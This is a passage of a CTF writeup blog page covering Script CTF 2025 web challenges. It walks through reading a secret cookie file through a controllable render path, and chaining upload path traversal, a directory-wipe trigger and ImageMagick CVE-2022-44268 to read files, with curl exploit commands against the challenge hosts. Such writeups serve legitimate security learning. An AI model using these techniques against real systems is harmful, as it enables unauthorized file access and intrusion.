<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>Script CTF 2025 - Writeups | GhostSquad</title>
<meta property="og:title" content="Script CTF 2025 - Writeups | GhostSquad"><meta name=twitter:title content="Script CTF 2025 - Writeups | GhostSquad"><meta itemprop=name content="Script CTF 2025 - Writeups | GhostSquad"><meta name=application-name content="Script CTF 2025 - Writeups | GhostSquad"><meta property="og:site_name" content="GhostSquad"><meta name=description content="Script CTF 2025 writeups"><meta itemprop=description content="Script CTF 2025 writeups"><meta property="og:description" content="Script CTF 2025 writeups"><meta name=twitter:description content="Script CTF 2025 writeups"><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><link rel=alternate hreflang=en-gb href=/posts/scriptctf-25/ title=English><meta property="og:type" content="article"><meta property="og:article:published_time" content=2025-08-24T00:00:00Z><meta property="article:published_time" content=2025-08-24T00:00:00Z><meta property="og:url" content="/posts/scriptctf-25/"><meta property="og:article:author" content="GhostSquad"><meta property="article:author" content="GhostSquad"><meta name=author content="GhostSquad"><script defer type=application/ld+json>{"@context":"http://schema.org","@type":"Article","headline":"Script CTF 2025 - Writeups","author":{"@type":"Person","name":""},"datePublished":"2025-08-24","description":"Script CTF 2025 writeups","wordCount":4568,"mainEntityOfPage":"True","dateModified":"2025-08-24","image":{"@type":"imageObject","url":""},"publisher":{"@type":"Organization","name":"GhostSquad"}}</script><meta name=generator content="Hugo 0.131.0"><meta property="og:url" content="/posts/scriptctf-25/"><meta property="og:site_name" content="GhostSquad"><meta property="og:title" content="Script CTF 2025 - Writeups"><meta property="og:description" content="Script CTF 2025 writeups"><meta property="og:locale" content="en_gb"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-08-24T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-24T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Script CTF 2025 - Writeups"><meta name=twitter:description content="Script CTF 2025 writeups"><link rel=canonical href=/posts/scriptctf-25/><link href=/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"><link rel=icon type=image/svg+xml href=/icons/favicon.svg></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
</a><input type=checkbox id=menu-trigger class=menu-trigger>
<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentcolor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class="menu-link active" href=/posts/>Posts</a></li><li><a class=menu-link href=/about/>About Us</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg><svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>Script CTF 2025 - Writeups</h1><div class=post-meta><time datetime=2025-08-24T00:00:00+00:00 itemprop=datePublished>24 Aug 2025</time></div></header><details class=toc zgotmplz><summary><b>Table of Contents</b></summary><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><a href=#renderer-100>Renderer (100)</a></li><li><a href=#wizard-gallery-491>Wizard Gallery (491)</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#secure-server-100>Secure-Server (100)</a></li><li><a href=#secure-server-2-432>Secure-Server 2 (432)</a></li><li><a href=#rsa-1-100>RSA-1 (100)</a></li><li><a href=#mod-285>Mod (285)</a></li><li><a href=#eaas-484>EaaS (484)</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#index-345>Index (345)</a></li></ul></li><li><a href=#reversing>Reversing</a><ul><li><a href=#plastic-shield-350>Plastic Shield (350)</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#div-100>Div (100)</a></li><li><a href=#emoji-100>emoji (100)</a></li><li><a href=#subtract>Subtract</a></li><li><a href=#enchant233>Enchant(233)</a></li><li><a href=#div-2324>Div 2(324)</a></li></ul></li><li><a href=#osint>OSINT</a><ul><li><a href=#the-insider107>The Insider(107)</a></li></ul></li><li><a href=#forensics>Forensics</a><ul><li><a href=#just-some-avocado302>Just Some Avocado(302)</a></li></ul></li></ul></nav></details><div class=page-content><p><img src=/img/scriptctf-25/Pasted%20image%2020250818132747.webp></p><h2 id=web>Web</h2><h3 id=renderer-100>Renderer (100)</h3><blockquote><p>Introducing Renderer! A free-to-use app to render your images!</p></blockquote><p>The challenge consists of a flask application. Three paths were defined:</p><p><strong>Upload:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s2>&#34;GET&#34;</span><span class=p>,</span> <span class=s2>&#34;POST&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s2>&#34;POST&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;file&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>files</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>file</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>files</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>file</span><span class=o>.</span><span class=n>filename</span> <span class=o>==</span> <span class=s2>&#34;&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>file</span> <span class=ow>and</span> <span class=n>allowed</span><span class=p>(</span><span class=n>file</span><span class=o>.</span><span class=n>filename</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>filename</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>filename</span>
</span></span><span class=line><span class=cl>            <span class=nb>hash</span> <span class=o>=</span> <span class=n>sha256</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>32</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>filepath</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;./static/uploads/</span><span class=si>{</span><span class=nb>hash</span><span class=si>}</span><span class=s1>.</span><span class=si>{</span><span class=n>filename</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>            <span class=n>file</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>filepath</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;/render/</span><span class=si>{</span><span class=nb>hash</span><span class=si>}</span><span class=s1>.</span><span class=si>{</span><span class=n>filename</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;upload.html&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>Uploaded file extension is check using <code>allowed</code>. There isn&rsquo;t much useful in here.</p><p><strong>Render:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/render/&lt;path:filename&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>render</span><span class=p>(</span><span class=n>filename</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;display.html&#34;</span><span class=p>,</span> <span class=n>filename</span><span class=o>=</span><span class=n>filename</span><span class=p>)</span>
</span></span></code></pre></div><p>This path is used to render the uploaded file. We can pass the filename as a parameter. In the <code>display.html</code>, it will create an iframe with <code>src</code> as <code>'/static/uploads/' + filename</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;{{&#39;/static/uploads/&#39; + filename }}&#34;</span> <span class=na>alt</span><span class=o>=</span><span class=s>&#34;Uploaded Image&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>Since we control the filename we can read all the files inside <code>/static/uploads/</code>.</p><p><strong>Developer:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/developer&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>developer</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>cookie</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;developer_secret_cookie&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>correct</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;./static/uploads/secrets/secret_cookie.txt&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>correct</span> <span class=o>==</span> <span class=s2>&#34;&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;./static/uploads/secrets/secret_cookie.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>sha256</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>16</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>correct</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;./static/uploads/secrets/secret_cookie.txt&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>cookie</span> <span class=o>==</span> <span class=n>correct</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;./static/uploads/secrets/secret_cookie.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>sha256</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>16</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=sa>f</span><span class=s2>&#34;Welcome! There is currently 1 unread message: </span><span class=si>{</span><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;flag.txt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;You are not a developer!&#34;</span>
</span></span></code></pre></div><p>There&rsquo;s a secret value stored inside <code>static/uploads/secrets/secret_cookie.txt</code>. To read the flag we have to set the value inside the <code>secret_cookie.txt</code> as our cookie.</p><p>To exploit first send a request to <code>/render/secrets/secret_cookie.txt</code> to read the cookie value</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250818145535.webp></p><p>now using this cookie, send another request to <code>/developer</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>curl -ik -H <span class=s2>&#34;Cookie: developer_secret_cookie=2500e50ea58e899f33ce3116acbb8d829e7ec5ac12803ede4b541892c8a525e4&#34;</span> http://127.0.0.1:1337/developer
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>Server</span><span class=o>:</span> <span class=l>Werkzeug/3.0.4 Python/3.10.12</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html; charset=utf-8</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>66</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Welcome! There is currently 1 unread message: scriptCTF{fakeflag}
</span></span></code></pre></div><h3 id=wizard-gallery-491>Wizard Gallery (491)</h3><blockquote><p>The council&rsquo;s top priority is to protect the flag, no matter the cost. Oh hey look, it&rsquo;s a photo gallery. What could go wrong?</p></blockquote><p><img src=/img/scriptctf-25/Pasted%20image%2020250818205904.webp></p><p>This is also another flask application. The challenge files had <code>ImageMagick</code> binaries</p><blockquote><p>ImageMagick, invoked from the command line as magick, is a free and open-source cross-platform software suite for displaying, creating, converting, modifying, and editing raster images</p></blockquote><p>It uses <code>ImageMagick</code> version 7. After a bit of searching I found that this version is vulnerable to <a href=https://git.rotfl.io/v/CVE-2022-44268><strong>CVE-2022-44268</strong></a> - Arbitrary File Read. If you are interested, you can read more about this bug and its root cause analysis <a href=https://www.vicarius.io/vsociety/posts/cve-2022-44268-arbitrary-remote-leak-in-imagemagick>here</a>.
If we can somehow control the file that is passed on to the <code>convert</code> program then, we can exploit this vulnerability and read the flag.</p><p>There&rsquo;s only one endpoint that uses the <code>convert</code> binary:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/logo-sm.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>logo_small</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># A smaller images looks better on mobile so I just resize it and serve that</span>
</span></span><span class=line><span class=cl>    <span class=n>logo_sm_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s2>&#34;UPLOAD_FOLDER&#34;</span><span class=p>],</span> <span class=s2>&#34;logo-sm.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>logo_sm_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;magick/bin/convert logo.png -resize 10% &#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>+</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s2>&#34;UPLOAD_FOLDER&#34;</span><span class=p>],</span> <span class=s2>&#34;logo-sm.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>send_from_directory</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s2>&#34;UPLOAD_FOLDER&#34;</span><span class=p>],</span> <span class=s2>&#34;logo-sm.png&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>It resizes <code>logo.png</code> and generates <code>logo-sm.png</code>. This is executed only if the <code>logo-sm.png</code> file doesn&rsquo;t already exist in the server. Now we need to check for two things:</p><ol><li>Find a way to replace the <code>logo.png</code> file with a malicious image</li><li>Delete the <code>logo-sm.png</code> if it already exists in the uploads directory</li></ol><p>This is the code responsible for file upload (I have snipped out some code):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/upload&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s2>&#34;POST&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_file</span><span class=p>():</span>
</span></span><span class=line><span class=cl>	<span class=o>...</span>
</span></span><span class=line><span class=cl>    <span class=n>file</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>files</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>file</span><span class=o>.</span><span class=n>filename</span> <span class=o>==</span> <span class=s2>&#34;&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>jsonify</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=o>...</span>
</span></span><span class=line><span class=cl>            <span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=mi>400</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Prevent uploading dangerous files</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;.&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>file</span><span class=o>.</span><span class=n>filename</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>wipe_upload_directory</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>jsonify</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=o>...</span>
</span></span><span class=line><span class=cl>            <span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=mi>403</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>is_blocked_extension</span><span class=p>(</span><span class=n>file</span><span class=o>.</span><span class=n>filename</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>wipe_upload_directory</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>jsonify</span><span class=p>(</span>
</span></span><span class=line><span class=cl>               <span class=o>...</span>
</span></span><span class=line><span class=cl>            <span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=mi>403</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>file</span> <span class=ow>and</span> <span class=n>allowed_file</span><span class=p>(</span><span class=n>file</span><span class=o>.</span><span class=n>filename</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>original_filename</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>filename</span>
</span></span><span class=line><span class=cl>        <span class=n>file_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s2>&#34;UPLOAD_FOLDER&#34;</span><span class=p>],</span> <span class=n>original_filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>file</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>file_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>file_size</span> <span class=o>=</span> <span class=n>get_file_size_mb</span><span class=p>(</span><span class=n>file_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;success&#34;</span><span class=p>:</span> <span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=o>...</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>jsonify</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=o>...</span>
</span></span><span class=line><span class=cl>            <span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=mi>400</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span></code></pre></div><p>The above code checks:</p><ol><li>If the filename is empty</li><li>If <code>.</code> is not present in the filename (that is filename without extension)</li><li>File extension is part of the <code>BLOCKED_EXTENSIONS</code> list</li><li>If file is allowed using <code>allowed_file()</code> function which again does some checks on the filename and file extension</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>ALLOWED_EXTENSIONS</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;png&#34;</span><span class=p>,</span> <span class=s2>&#34;jpg&#34;</span><span class=p>,</span> <span class=s2>&#34;jpeg&#34;</span><span class=p>,</span> <span class=s2>&#34;gif&#34;</span><span class=p>,</span> <span class=s2>&#34;bmp&#34;</span><span class=p>,</span> <span class=s2>&#34;webp&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>BLOCKED_EXTENSIONS</span> <span class=o>=</span> <span class=p>{</span> <span class=s2>&#34;exe&#34;</span><span class=p>,</span> <span class=s2>&#34;jar&#34;</span><span class=p>,</span> <span class=s2>&#34;py&#34;</span><span class=p>,</span> <span class=s2>&#34;pyc&#34;</span><span class=p>,</span> <span class=s2>&#34;php&#34;</span><span class=p>,</span> <span class=s2>&#34;js&#34;</span><span class=p>,</span> <span class=s2>&#34;sh&#34;</span><span class=p>,</span> <span class=s2>&#34;bat&#34;</span><span class=p>,</span> <span class=s2>&#34;cmd&#34;</span><span class=p>,</span> <span class=s2>&#34;com&#34;</span><span class=p>,</span> <span class=s2>&#34;scr&#34;</span><span class=p>,</span> <span class=s2>&#34;vbs&#34;</span><span class=p>,</span> <span class=s2>&#34;pl&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>,</span> <span class=s2>&#34;go&#34;</span><span class=p>,</span> <span class=s2>&#34;rs&#34;</span><span class=p>,</span> <span class=s2>&#34;c&#34;</span><span class=p>,</span> <span class=s2>&#34;cpp&#34;</span><span class=p>,</span> <span class=s2>&#34;h&#34;</span> <span class=p>}</span>
</span></span></code></pre></div><p>If all the checks are passed the <code>original_filename</code> is concatenated with the <code>UPLOAD_FOLDER</code>, and the file is saved in that location. However, filenames containing <code>../</code> are allowed, which means we can save a file outside the uploads directory. (Note that the <code>logo.png</code> is located outside the uploads directory.)
And another important thing to note here is the <code>wipe_upload_directory()</code> function which will delete all the files inside the uploads directory. This is called if the filename doesn&rsquo;t contain a <code>.</code> character or file extension is part of the <code>BLOCKED_EXTENSIONS</code> list. We can use this &ldquo;functionality&rdquo; to delete the existing <code>logo-sm.png</code> file.</p><p>Full attack plan:</p><ul><li>Send a <code>POST</code> request to <code>/uploads</code> with a filename containing one of the blocked extensions, which will delete the existing logo.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>curl -XPOST <span class=s1>&#39;http://play.scriptsorcerers.xyz:10152/upload&#39;</span> -ik -F <span class=nv>file</span><span class=o>=</span>@test.php
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>403</span> <span class=ne>FORBIDDEN</span>
</span></span><span class=line><span class=cl><span class=n>Server</span><span class=o>:</span> <span class=l>Werkzeug/3.1.3 Python/3.10.18</span>
